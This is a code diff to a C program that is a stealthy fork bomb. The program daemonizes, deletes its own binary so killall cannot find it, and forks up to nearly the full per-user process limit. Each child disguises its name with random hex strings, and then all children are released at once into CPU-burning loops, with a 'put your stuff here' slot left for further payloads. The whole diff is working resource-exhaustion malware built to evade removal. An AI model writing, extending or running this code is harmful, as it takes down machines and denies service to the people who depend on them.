@@ -20,91 +20,132 @@
 #include <string.h>
 #include <time.h>
 #include <err.h>
+#include <fcntl.h>
+#include <sys/resource.h>
+#include <signal.h>
 
-/* amount of forks created before the parent exited */
-#define MAXFORKS 4
+
+static void chprocname (char *, int);
+static void payload (void);
+static void sig_prepare (void);
 
 
 int
 main (int argc, char *argv[])
 {
         char executable[PATH_MAX];
-        char temp[16];
         pid_t cpid;
         int len, nlen;
-        int count = MAXFORKS;
+        unsigned count;
         int i, k;
-        char *p;
-        struct timespec wtime, ptime;
-
+        struct timespec wtime;
+        int nproc;
+        struct rlimit rl;
 
         /* child fork sleep time */
         wtime.tv_sec = 0;
-        wtime.tv_nsec = 1000000; /* 1 msec */
+        wtime.tv_nsec = 100000000; /* 100 msec */
 
-        /* payload sleep time */
-        ptime.tv_sec = 0;
-        ptime.tv_nsec = 50000000; /* 50 msec */
-
+        /* daemonize */
         while ((cpid = fork ()) == -1)
-            sleep (1);
-
+                nanosleep (&wtime, NULL);
         if (cpid > 0)
-            exit (EXIT_SUCCESS); /* daemonize */
-
+                exit (EXIT_SUCCESS);
         if (chdir ("/") < 0)
-            err (1, "chdir");
+                err (1, "chdir");
 
+        /* killall(1) is looking for /proc/[pid]/exe */
         len = strlen (argv[0]);
         strncpy (executable, argv[0], len);
-        unlink (executable); /* killall(1) looks for /proc/[pid]/exe */
+        unlink (executable);
 
+        sig_prepare ();
+        if (getrlimit (RLIMIT_NPROC, &rl) == -1)
+                err (1, "rlimit");
+        count = (unsigned)rl.rlim_max;
+        count -= count / 20.0;
         while (count--) {
                 while ((cpid = fork ()) == -1)
-                    nanosleep (&wtime, NULL);
+                        nanosleep (&wtime, NULL);
+                srand ((unsigned)count);
+                chprocname (argv[0], len);
+                if (cpid > 0)
+                        continue;
+                payload ();
+        }
+        /* zerg! */
+        kill (0, SIGUSR1);
+        return 0;
+}
 
-                /* parent process continues cloning itself */
-                if (cpid > 0) {
-                        if (count == 0)
-                                exit (EXIT_SUCCESS); /* stop parent */
-                        else
-                                continue;
-                }
+static void
+chprocname (char *argv0, int len)
+{
+        char next[256], temp[16], *p;
+        int i, k, nlen;
 
-                setsid ();
+        if ((p = malloc (sizeof (char))) == NULL)
+                exit (EXIT_FAILURE);
 
-                if ((p = malloc (sizeof(char))) == NULL)
-                    exit (EXIT_FAILURE);
+        sprintf (temp, "%lx", (long unsigned)p);
+        nlen = strlen (temp);
+        free (p); /* prevent cow "hacks" */
 
-                sprintf (temp, "%lx", (long unsigned int)p);
-                nlen = strlen (temp) - MAXFORKS;
-                free (p); /* prevent cow "hacks" */
-
-                char next[256];
-                for (i = 0, k = count; i < len; i++, k++) {
-                        if (k >= nlen)
-                                k = 0;
-                        next[i] = temp[k];
-                }
-                next[i] = '\0';
+        for (i = 0, k = rand () % 11; i < len; i++, k++) {
+                if (k >= nlen)
+                        k = 0;
+                next[i] = temp[k];
+        }
+        next[i] = '\0';
 
 #if defined(__linux__)
-                /* /proc/[pid]/cmdline */
-                strncpy (argv[0], next, len);
-                /* /proc/[pid]/comm */
-                prctl (PR_SET_NAME, (unsigned long)next, 0, 0, 0);
+        /* /proc/[pid]/cmdline */
+        strncpy (argv0, next, len);
+        /* /proc/[pid]/comm */
+        prctl (PR_SET_NAME, (unsigned long)next, 0, 0, 0);
 #elif defined(__FreeBSD__)
-                setproctitle ("%s", next);
+        /* we are helpless there */
+        setproctitle ("%s", next);
 #else
-                strncpy (argv[0], next, len); /* cmdline */
+        /* cmdline */
+        strncpy (argv0, next, len);
 #endif
-                /*
-                 * payload: put your stuff
-                 */
-                if (count == 0) /*pause ();*/
-                        count = MAXFORKS;
-                nanosleep (&ptime, NULL);
-        }
+}
 
-        return 0;
+static volatile sig_atomic_t sigflag;
+static sigset_t newmask, oldmask, zeromask;
+
+static void
+sig_usr (int signo)
+{
+        sigflag = 1;
+}
+
+static void
+sig_prepare (void)
+{
+        if (signal(SIGUSR1, sig_usr) == SIG_ERR)
+                err (1, "signal");
+        sigemptyset (&zeromask);
+        sigemptyset (&newmask);
+        sigaddset (&newmask, SIGUSR1);
+        if (sigprocmask (SIG_BLOCK, &newmask, &oldmask) < 0)
+                err (1, "sig_block");
+}
+
+static void
+payload (void)
+{
+        long unsigned xxx = 0;
+
+        while (sigflag == 0)
+                sigsuspend (&zeromask);
+        sigflag = 0;
+        if (sigprocmask (SIG_SETMASK, &oldmask, NULL) < 0)
+                err (1, "sig_setmask");
+        setsid ();
+
+        /* put your stuff here */
+        while (1)
+                xxx += rand ();
 }
